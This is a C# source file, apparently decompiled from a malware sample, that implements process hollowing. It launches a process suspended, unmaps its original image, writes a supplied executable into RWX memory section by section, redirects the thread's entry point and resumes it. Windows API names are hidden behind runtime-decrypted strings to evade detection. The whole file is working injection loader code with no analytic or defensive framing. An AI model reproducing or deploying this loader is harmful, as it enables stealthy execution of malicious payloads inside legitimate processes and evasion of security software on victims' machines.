using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

public class GClass0
{
	public delegate bool GDelegate0(string string_0, string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, uint uint_0, IntPtr environment, string currentDirectory, ref GStruct1 startupInfo, ref GStruct0 processInformation);

	public delegate bool GDelegate1(IntPtr thread, int[] context);

	public delegate bool GDelegate2(IntPtr thread, int[] context);

	public delegate bool GDelegate3(IntPtr thread, int[] context);

	public delegate bool GDelegate4(IntPtr thread, int[] context);

	public delegate bool GDelegate5(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

	public delegate bool GDelegate6(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

	public delegate int GDelegate7(IntPtr process, int baseAddress);

	public delegate int GDelegate8(IntPtr handle, int address, int length, int type, int protect);

	public delegate int GDelegate9(IntPtr handle);

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct GStruct0
	{
		public IntPtr ProcessHandle;

		public IntPtr ThreadHandle;

		public uint ProcessId;

		public uint ThreadId;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct GStruct1
	{
		public uint Size;

		public string Reserved1;

		public string Desktop;

		public string Title;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
		public byte[] Misc;

		public IntPtr Reserved2;

		public IntPtr StdInput;

		public IntPtr StdOutput;

		public IntPtr StdError;
	}

	private Dynamic Dynamic;

	private static readonly GDelegate0 gdelegate0_0 = Dynamic.CreateApi<GDelegate0>("kernel32", Encryption.DecryptText("ĈőŘĝŏŒįķŎŖġŎŠĠz", "KeyBase"));

	private static readonly GDelegate1 gdelegate1_0 = Dynamic.CreateApi<GDelegate1>("kernel32", Encryption.DecryptText("ŝƕƸšƔưƕŷƔƇżƚƲƕƎƤË", "KeyBase"));

	private static readonly GDelegate2 gdelegate2_0 = Dynamic.CreateApi<GDelegate2>("kernel32", Encryption.DecryptText("ķůƒĻŮƊůőŮšŖŴƌůŨž¥", "KeyBase"));

	private static readonly GDelegate3 gdelegate3_0 = Dynamic.CreateApi<GDelegate3>("kernel32", Encryption.DecryptText("ńŰƓļůƋŰŒůŢŗŵƍŰũſ¦", "KeyBase"));

	private static readonly GDelegate4 gdelegate4_0 = Dynamic.CreateApi<GDelegate4>("kernel32", Encryption.DecryptText("ŨƚƶľśƌƐƅſƧźƌƚƏŔƚƭżƌƱƟÆ", "KeyBase"));

	private static readonly GDelegate5 gdelegate5_0 = Dynamic.CreateApi<GDelegate5>("kernel32", Encryption.DecryptText("ĴšűĽňżūŅšƃŌŅůũőŮƉ\u0097", "KeyBase"));

	private static readonly GDelegate6 gdelegate6_0 = Dynamic.CreateApi<GDelegate6>("kernel32", Encryption.DecryptText("ŇżƇśūŨżşŭƃŚŹťůŝŹƐŠ¥", "KeyBase"));

	private static readonly GDelegate7 gdelegate7_0 = Dynamic.CreateApi<GDelegate7>("ntdll", Encryption.DecryptText("ıűŦňŦŬŭĹŦŶőňűŐňŠƅŃŨŹ\u0098", "KeyBase"));

	private static readonly GDelegate8 gdelegate8_0 = Dynamic.CreateApi<GDelegate8>("kernel32", Encryption.DecryptText("ńűƎřŹŷŴįŴƈŔŧśƀ£", "KeyBase"));

	private static readonly GDelegate9 gdelegate9_0 = Dynamic.CreateApi<GDelegate9>("kernel32", Encryption.DecryptText("ŵƢǄƏƦưƑƋƯƶŻƝØ", "KeyBase"));

	public GClass0()
	{
		Dynamic = new Dynamic();
	}

	public static bool smethod_0(string path, string cmd, byte[] data, bool compatible)
	{
		int num = 1;
		do
		{
			if (!smethod_1(path, cmd, data, compatible))
			{
				num = checked(num + 1);
				continue;
			}
			return true;
		}
		while (num <= 5);
		return false;
	}

	private static bool smethod_1(string path, string cmd, byte[] data, bool compatible)
	{
		string text = $"\"{path}\"";
		GStruct1 startupInfo = default(GStruct1);
		GStruct0 processInformation = default(GStruct0);
		checked
		{
			startupInfo.Size = (uint)Marshal.SizeOf(typeof(GStruct1));
			try
			{
				if (!string.IsNullOrEmpty(cmd))
				{
					text = text + " " + cmd;
				}
				if (!gdelegate0_0(path, text, IntPtr.Zero, IntPtr.Zero, bool_0: false, 4u, IntPtr.Zero, null, ref startupInfo, ref processInformation))
				{
					throw new Exception();
				}
				int num = BitConverter.ToInt32(data, 60);
				int num2 = BitConverter.ToInt32(data, num + 52);
				int[] array = new int[179];
				array[0] = 65538;
				if (IntPtr.Size == 4)
				{
					if (!gdelegate2_0(processInformation.ThreadHandle, array))
					{
						throw new Exception();
					}
				}
				else if (!gdelegate1_0(processInformation.ThreadHandle, array))
				{
					throw new Exception();
				}
				int num3 = array[41];
				int buffer = default(int);
				int bytesRead = default(int);
				if (!gdelegate5_0(processInformation.ProcessHandle, num3 + 8, ref buffer, 4, ref bytesRead))
				{
					throw new Exception();
				}
				if (num2 == buffer && gdelegate7_0(processInformation.ProcessHandle, buffer) != 0)
				{
					throw new Exception();
				}
				int length = BitConverter.ToInt32(data, num + 80);
				int bufferSize = BitConverter.ToInt32(data, num + 84);
				int num4 = gdelegate8_0(processInformation.ProcessHandle, num2, length, 12288, 64);
				bool flag = default(bool);
				if (!compatible && num4 == 0)
				{
					flag = true;
					num4 = gdelegate8_0(processInformation.ProcessHandle, 0, length, 12288, 64);
				}
				if (num4 == 0)
				{
					throw new Exception();
				}
				if (!gdelegate6_0(processInformation.ProcessHandle, num4, data, bufferSize, ref bytesRead))
				{
					throw new Exception();
				}
				int num5 = num + 248;
				short num6 = BitConverter.ToInt16(data, num + 6);
				int num7 = num6 - 1;
				for (int i = 0; i <= num7; i++)
				{
					int num8 = BitConverter.ToInt32(data, num5 + 12);
					int num9 = BitConverter.ToInt32(data, num5 + 16);
					int srcOffset = BitConverter.ToInt32(data, num5 + 20);
					if (num9 != 0)
					{
						byte[] array2 = new byte[num9 - 1 + 1];
						Buffer.BlockCopy(data, srcOffset, array2, 0, array2.Length);
						if (!gdelegate6_0(processInformation.ProcessHandle, num4 + num8, array2, array2.Length, ref bytesRead))
						{
							throw new Exception();
						}
					}
					num5 += 40;
				}
				byte[] bytes = BitConverter.GetBytes(num4);
				if (!gdelegate6_0(processInformation.ProcessHandle, num3 + 8, bytes, 4, ref bytesRead))
				{
					throw new Exception();
				}
				int num10 = BitConverter.ToInt32(data, num + 40);
				if (flag)
				{
					num4 = num2;
				}
				array[44] = num4 + num10;
				if (IntPtr.Size == 4)
				{
					if (!gdelegate3_0(processInformation.ThreadHandle, array))
					{
						throw new Exception();
					}
				}
				else if (!gdelegate4_0(processInformation.ThreadHandle, array))
				{
					throw new Exception();
				}
				if (gdelegate9_0(processInformation.ThreadHandle) == -1)
				{
					throw new Exception();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Process.GetProcessById((int)processInformation.ProcessId)?.Kill();
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}
}
